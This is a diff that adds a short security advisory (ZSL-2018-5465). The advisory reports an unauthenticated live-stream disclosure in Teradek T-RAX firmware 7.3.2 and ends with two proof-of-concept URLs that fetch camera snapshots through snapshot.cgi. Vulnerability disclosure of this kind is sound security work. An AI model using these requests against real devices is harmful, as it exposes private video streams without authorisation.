@@ -1,0 +1,34 @@
+
+Teradek T-RAX 7.3.2 (snapshot.cgi) Stream Disclosure
+
+
+Vendor: Teradek, LLC
+Product web page: https://www.teradek.com
+Affected version: Firmware Version: 7.3.2 (build 24453)
+                  Teradek Firmware Version 7.3.15
+
+
+Summary: T-RAX is a high-density enterprise-grade H.264 platform
+that encodes, decodes, and streams video at broadcast quality.
+
+Desc: T-RAX suffers from an unauthenticated and unauthorized live
+stream disclosure when snapshot.cgi script is called.
+
+Tested on: lighttpd/1.4.31
+
+
+Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
+                            @zeroscience
+
+
+Advisory ID: ZSL-2018-5465
+Advisory URL: https://www.zeroscience.mk/en/vulnerabilities/ZSL-2018-5465.php
+
+
+02.03.2018
+
+--
+
+
+http://127.0.0.1:8089/cgi-bin/snapshot.cgi  <-- Generate new and view (redirects to /snapshot.jpg)
+http://127.0.0.1:8089/snapshot.jpg          <-- View stored
